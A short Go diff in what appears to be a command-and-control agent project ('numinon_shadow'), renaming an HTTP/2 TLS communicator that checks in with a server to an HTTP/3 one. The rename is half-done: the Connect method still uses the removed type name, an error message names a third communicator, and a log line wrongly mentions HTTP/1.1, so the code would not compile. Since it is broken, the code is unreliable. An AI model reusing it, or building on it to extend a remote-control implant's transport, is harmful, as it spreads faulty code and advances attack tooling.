@@ -11,15 +11,16 @@ import (
 	"numinon_shadow/internal/agent/config"
 )
 
-var _ Communicator = (*Http2TLSCommunicator)(nil)
+var _ Communicator = (*Http3Communicator)(nil)
 
-type Http2TLSCommunicator struct {
+type Http3Communicator struct {
 	agentConfig config.AgentConfig
 	httpClient  *http.Client
 }
 
-func NewHttp2TLSCommunicator(cfg config.AgentConfig) (*Http2TLSCommunicator, error) {
-	err := BasicValidateH2TLS(cfg)
+// NewHttp3Communicator creates an HTTP/3 communicator.
+func NewHttp3Communicator(cfg config.AgentConfig) (*Http3Communicator, error) {
+	err := BasicValidateH3(cfg)
 	if err != nil {
 		return nil, err
 	}
@@ -46,8 +47,8 @@ func NewHttp2TLSCommunicator(cfg config.AgentConfig) (*Http2TLSCommunicator, err
 
 }
 
-func BasicValidateH2TLS(cfg config.AgentConfig) error {
-	if cfg.Protocol != config.HTTP2TLS {
+func BasicValidateH3(cfg config.AgentConfig) error {
+	if cfg.Protocol != config.HTTP3 {
 		return fmt.Errorf("mismatched config: NewHttp2ClearCommunicator called with protocol %s", cfg.Protocol)
 	}
 	if cfg.ServerIP == "" || cfg.ServerPort == "" || cfg.CheckInEndpoint == "" {
@@ -57,7 +58,7 @@ func BasicValidateH2TLS(cfg config.AgentConfig) error {
 }
 
 func (c *Http2TLSCommunicator) Connect() error {
-	log.Printf("|COMM %s|-> Connect() called. Typically no-op for HTTP/2.", c.agentConfig.Protocol)
+	log.Printf("|COMM %s|-> Connect() called. Typically no-op for HTTP/1.1.", c.agentConfig.Protocol)
 	return nil
 }
 
